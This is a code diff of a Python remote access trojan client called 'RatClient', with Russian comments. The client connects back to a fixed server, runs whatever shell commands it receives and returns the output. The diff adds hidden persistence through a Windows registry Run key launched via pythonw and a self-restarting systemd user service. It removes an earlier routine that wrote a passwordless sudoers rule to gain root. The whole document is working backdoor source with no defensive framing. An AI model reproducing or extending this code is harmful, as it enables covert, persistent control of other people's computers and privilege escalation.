@@ -3,9 +3,8 @@ import subprocess
 import os
 import sys
 import time
-import getpass
 
-SERVER_IP = "192.168.100.3"  # IP сервера, обновите под вашу сеть
+SERVER_IP = "192.168.100.3"  # IP сервера нужно обновить под твою сеть
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
 
@@ -19,35 +18,122 @@ def execute_command(command):
 def is_windows():
     return os.name == 'nt'
 
-def ensure_sudo_nopasswd():
-    username = getpass.getuser()
-    sudoers_line = f"{username} ALL=(ALL) NOPASSWD:ALL\n"
-    sudoers_dir = "/etc/sudoers.d"
-    sudoers_file = os.path.join(sudoers_dir, f"ratclient_{username}")
+def add_to_autostart_windows():
+    try:
+        import winreg
+    except ImportError:
+        return False, "Модуль winreg не доступен"
 
     try:
-        # Проверим, есть ли уже такой файл и содержит ли он нужную строку
-        if os.path.exists(sudoers_file):
-            with open(sudoers_file, "r") as f:
-                content = f.read()
-            if sudoers_line.strip() in content:
-                return True, "NOPASSWD правило уже установлено"
+        exe_path = sys.executable
+        script_path = os.path.abspath(__file__)
+        if exe_path.lower().endswith("python.exe"):
+            pythonw_path = exe_path[:-4] + "w.exe"
+            if os.path.exists(pythonw_path):
+                exe_path = pythonw_path
 
-        # Записываем в отдельный файл sudoers
-        with open(sudoers_file, "w") as f:
-            f.write(sudoers_line)
+        cmd = f'"{exe_path}" "{script_path}"'
 
-        # Проверяем правильность синтаксиса
-        result = subprocess.run(["visudo", "-cf", sudoers_file], capture_output=True)
-        if result.returncode != 0:
-            os.remove(sudoers_file)
-            return False, "Ошибка проверки sudoers файла: " + result.stderr.decode()
-
-        return True, "NOPASSWD правило успешно добавлено"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Run",
+                             0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "RatClient", 0, winreg.REG_SZ, cmd)
+        winreg.CloseKey(key)
+        return True, "Добавлено в автозагрузку Windows"
     except Exception as e:
-        return False, f"Не удалось настроить NOPASSWD: {e}"
+        return False, f"Ошибка при добавлении в автозагрузку Windows: {e}"
+
+def is_in_autostart_windows():
+    try:
+        import winreg
+    except ImportError:
+        return False
+
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            r"Software\Microsoft\Windows\CurrentVersion\Run",
+                            0, winreg.KEY_READ)
+        i = 0
+        while True:
+            name, _, _ = winreg.EnumValue(key, i)
+            if name == "RatClient":
+                return True
+            i += 1
+    except OSError:
+        return False
+
+def add_to_autostart_linux():
+    home = os.path.expanduser("~")
+    systemd_dir = os.path.join(home, ".config", "systemd", "user")
+    if not os.path.isdir(systemd_dir):
+        os.makedirs(systemd_dir, exist_ok=True)
+
+    service_path = os.path.join(systemd_dir, "ratclient.service")
+
+    python_path = sys.executable
+    script_path = os.path.abspath(__file__)
+
+    service_content = f"""[Unit]
+Description=Rat Client Service
+After=network-online.target
+
+[Service]
+ExecStart={python_path} {script_path}
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=default.target
+"""
+
+    if os.path.exists(service_path):
+        with open(service_path, "r", encoding="utf-8") as f:
+            existing = f.read()
+        if existing == service_content:
+            return True, f"systemd сервис уже установлен: {service_path}"
+
+    try:
+        with open(service_path, "w", encoding="utf-8") as f:
+            f.write(service_content)
+    except Exception as e:
+        return False, f"Ошибка записи файла systemd unit: {e}"
+
+    try:
+        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
+        subprocess.run(["systemctl", "--user", "enable", "ratclient.service"], check=True)
+        subprocess.run(["systemctl", "--user", "start", "ratclient.service"], check=True)
+    except Exception as e:
+        return False, f"Ошибка в systemctl: {e}"
+
+    return True, f"systemd сервис установлен и запущен: {service_path}"
+
+def is_in_autostart_linux():
+    home = os.path.expanduser("~")
+    service_path = os.path.join(home, ".config", "systemd", "user", "ratclient.service")
+    return os.path.exists(service_path)
+
+def add_self_to_autostart():
+    if is_windows():
+        if not is_in_autostart_windows():
+            success, msg = add_to_autostart_windows()
+            print(msg)
+        else:
+            print("Уже добавлен в автозагрузку Windows")
+    else:
+        if not is_in_autostart_linux():
+            success, msg = add_to_autostart_linux()
+            print(msg)
+            print("Если сервис не стартует после перезагрузки, выполните в терминале:")
+            print("sudo loginctl enable-linger $USER")
+        else:
+            print("Уже добавлен в systemd автозапуск")
 
 def main():
+    try:
+        add_self_to_autostart()
+    except Exception as e:
+        print(f"Ошибка добавления в автозапуск: {e}")
+
     current_dir = os.getcwd()
 
     while True:
@@ -67,8 +153,7 @@ def main():
                     break
 
                 if data.startswith("cmd:"):
-                    cmd = data[4:].strip()
-
+                    cmd = data[4:]
                     if cmd.startswith("cd"):
                         path = cmd[2:].strip()
                         if not path:
@@ -79,21 +164,6 @@ def main():
                             s.send(f"Сменена директория на {current_dir}".encode(errors='ignore'))
                         except Exception as e:
                             s.send(f"Ошибка смены директории: {e}".encode(errors='ignore'))
-
-                    elif cmd == "sudo -n su":
-                        # Попытка выполнить sudo su без пароля
-                        output = execute_command("sudo -n su")
-                        out_lower = output.lower()
-                        if ("password" in out_lower or "auth" in out_lower or
-                                "с отказом" in out_lower or "языком sudo" in out_lower):
-                            # Ошибка с паролем, пытаемся автоматически настроить NOPASSWD
-                            success, msg = ensure_sudo_nopasswd()
-                            if success:
-                                output = "NOPASSWD правило успешно добавлено. Пожалуйста, попробуйте команду снова."
-                            else:
-                                output = f"Ошибка добавления NOPASSWD: {msg}"
-                        s.send(output.encode(errors='ignore'))
-
                     else:
                         output = execute_command(cmd)
                         s.send(output.encode(errors='ignore'))
@@ -134,7 +204,7 @@ def main():
                 else:
                     s.send("Неизвестная команда".encode(errors='ignore'))
 
-        except Exception:
+        except:
             pass
         finally:
             s.close()
